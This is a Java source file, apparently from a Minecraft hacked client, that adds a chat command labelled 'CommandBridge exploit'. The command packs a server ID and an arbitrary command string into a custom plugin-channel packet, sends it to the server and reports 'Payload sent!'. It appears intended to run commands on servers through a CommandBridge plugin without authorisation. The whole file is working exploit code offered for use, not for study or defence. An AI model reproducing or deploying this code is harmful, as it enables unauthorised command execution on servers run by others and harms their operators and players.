package net.paradise_client.command.impl;

import com.mojang.brigadier.arguments.StringArgumentType;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import com.mojang.brigadier.builder.RequiredArgumentBuilder;
import com.mojang.brigadier.context.CommandContext;
import net.paradise_client.Helper;
import net.minecraft.command.CommandSource;
import net.minecraft.network.packet.c2s.common.CustomPayloadC2SPacket;
import net.minecraft.client.MinecraftClient;
import net.paradise_client.command.Command;
import net.paradise_client.packet.CommandBridgePacket;

import static com.mojang.brigadier.builder.RequiredArgumentBuilder.argument;

public class CommandBridge extends Command {

    public CommandBridge() {
        super("cmdbri", "CommandBridge exploit");
    }

    @Override
    public void build(LiteralArgumentBuilder<CommandSource> root) {
        root
            .then(argument("serverID", StringArgumentType.string())
            .then(argument("command", StringArgumentType.greedyString())
            .executes(this::sendPayload)))
            .executes(this::incomplete);
    }

    private int sendPayload(CommandContext<?> context) {
        String command = context.getArgument("command", String.class);
        String serverID = context.getArgument("serverID", String.class);
        CustomPayloadC2SPacket packet = new CustomPayloadC2SPacket(new CommandBridgePacket(command, serverID));
        Helper.sendPacket(packet);
        Helper.printChatMessage("Payload sent!");
        return SINGLE_SUCCESS;
    }

    private int incomplete(CommandContext<?> context) {
        Helper.printChatMessage("Incomplete command!");
        return SINGLE_SUCCESS;
    }
}
